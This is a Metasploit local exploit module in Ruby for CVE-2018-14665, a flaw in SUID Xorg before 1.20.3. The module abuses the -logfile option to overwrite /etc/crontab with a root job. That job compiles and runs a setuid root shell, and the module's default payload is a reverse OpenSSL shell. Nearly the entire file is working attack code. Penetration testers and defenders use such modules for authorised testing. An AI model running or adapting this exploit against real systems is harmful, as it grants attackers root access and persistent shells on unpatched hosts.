##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xorg X11 Server SUID privilege escalation',
      'Description'    => %q{
        This module attempts to gain root privileges with SUID Xorg X11 server
        versions prior to 1.20.3.

        A permission check flaw exists for -modulepath and -logfile options when
        starting Xorg prior to 1.20.3.  This allows unprivileged users with the
        ability to log in to the system via console to escalate their privileges
        and run arbitrary code under root privileges (CVE-2018-14665).

        This module writes a cron job using the Xorg -logfile option. The job
        will run a small script to launch an executable. It has been tested with
        OpenBSD 6.3,6.4 and CentOS 7.  Xorg must have SUID permissions. Success
        on CentOS depends on the session having console for starting Xorg
        along with selinux settings, may work but is currently not supported.

      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Narendra Shinde', # Discovery and exploit
          'Raptor - 0xdea',  # Modified exploit for cron
          'Aaron Ringo'      # Metasploit module
        ],

      'DisclosureDate' => 'Oct 25 2018',
      'Platform'       =>  %w(linux unix openbsd),
      'Arch'           =>    ARCH_CMD,
      'SessionTypes'   =>    'shell', #Shell is needed to start Xorg in Linux
      'Targets'        =>
         [
           ['OpenBSD', {
            'Platform' => 'unix',
            'Arch' => [ ARCH_CMD ] } ]
          ],
      'DefaultOptions' =>
         {
             'Target'  => '0',
             'PAYLOAD' => 'cmd/unix/reverse_openssl'
         },

    ))
    register_options(
      [
        OptString.new('SCRIPT', [ true, 'Script dirictory', '/tmp/' ]),
        OptString.new('PAYLOAD_LOC', [ true, 'Path that contain SUID binary', '/usr/local/bin/shell' ]),
        OptBool.new('BUILTIN', [ true, "Privesc in current session ",true ])
      ])
  end


  def check
    xorg_path = cmd_exec("which Xorg")
    vprint_good "Xorg path found at #{xorg_path}"
    if setuid? xorg_path
      vprint_good "Xorg binary detected as SUID"
      proc_list = []
      proc_list = cmd_exec('ps ax')
      if proc_list.include?("X")
        vprint_warning("Xorg in process list, Can you stop it? ")
        return CheckCode::Safe
      else
        vprint_good("Xorg does not appear running")
        return CheckCode::Appears
      end
    else
      return CheckCode::Safe
    end
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def exploit
    check_status = check
    unless check_status == CheckCode::Appears
       fail_with Failure::NotVulnerable, "Target not vulnerable"
    end

    if is_root?
      fail_with Failure::BadConfig, 'This session already has root privileges'
    end

    # Defines path to script that will chmod the payload
    builtin_only = "#{datastore['BUILTIN']}"
    payload_path = "#{datastore['PAYLOAD_LOC']}"
    pscript = "#{datastore['SCRIPT']}.session-#{rand_text_alphanumeric rand(5..10)}"
    payload_c = "#{pscript}.c"

    # Universal stub for file crontab will run
    cmd_exec "echo '#!/bin/sh' > #{pscript}"
    cmd_exec "chmod +x #{pscript}"

    # Upload for the text payloads
    if builtin_only == 'false'
      print_status 'Uploading your payload'
      exp = payload.encoded.gsub('"', '\"').gsub('$', '\$')
      cmd_exec "echo \"#{exp}\" >> #{pscript}"
    else
      print_good 'Attempting privesc within current session'
      cmd_exec "echo cp /bin/sh #{payload_path} > #{pscript}"
      cmd_exec "echo \'main(){setuid(0);setgid(0);system(\"/bin/sh\");}\' > #{payload_c}"
      cmd_exec "echo gcc #{payload_c} -o #{payload_path} >> #{pscript}"
      cmd_exec "echo chmod 4777 #{payload_path} >> #{pscript}"
      register_file_for_cleanup payload_c
      register_file_for_cleanup payload_path
    end
    register_file_for_cleanup pscript

    # Exploit steps on crontab so backing it up
    cmd_exec "cat /etc/crontab > #{pscript}.b"

    # Actual exploit
    print_status 'Trying /etc/crontab overwrite'
    cmd_exec "cd /etc ; Xorg -fp '* * * * * root #{pscript}' -logfile crontab :1 & >/dev/null"
    sleep 5
    cmd_exec "pkill Xorg"
    sleep 5
    cron_check = cmd_exec "egrep #{pscript} /etc/crontab"
    if cron_check.include? pscript
      print_good '/etc/crontab overwrite successful'
    else
      fail_with Failure::NotVulnerable, "/etc/crontab not modified"
    end

    i = 0
    while i < 12
      print_status 'Waiting on cron to run'
      sleep 10
      i += 1
      break if exists? payload_path
      break if !exists? pscript      # will be cleaned up on successful exploit
    end

    #Time to become root and clean up a little
    if builtin_only == 'true'
      print_good 'Payload written..executing'
      cmd_exec "#{payload_path}"
      if is_root?
        print_good 'Your session now has root privileges'
        print_good 'Cleaning up and restoring crontab entries'
        cmd_exec "cat #{pscript}.b > /etc/crontab"
        cmd_exec "rm -f /etc/crontab.old"
      end
    else
      sleep 5
      print_status "This scripts session does not have root"
      print_warning "You have some clean up to do in new session"
      print_warning "cat #{pscript}.b > /etc/crontab ; rm -f #{pscript}.*"
      print_warning "rm -f /etc/crontab.old"
    end
  end
end
